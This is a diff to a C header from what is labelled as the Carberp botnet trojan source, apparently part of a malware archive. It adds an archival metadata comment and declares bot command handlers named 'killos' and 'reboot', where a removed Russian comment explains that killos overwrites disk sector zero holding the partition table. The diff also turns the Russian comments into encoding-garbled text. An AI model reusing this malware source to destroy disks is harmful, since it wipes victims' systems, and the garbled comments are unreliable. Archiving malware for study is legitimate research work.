@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef KillOs_RebootH
 #define KillOs_RebootH
 #include <windows.h>
@@ -6,9 +17,9 @@
 	const PCHAR killos = "killos";
 	const PCHAR Reboot_System = "reboot";
 	
-	// перезаписывает нулевой сектор, а там находиться Таблица разделов  
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  
 	bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);
-	// перегружаем
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);
 
 	bool KillOs();
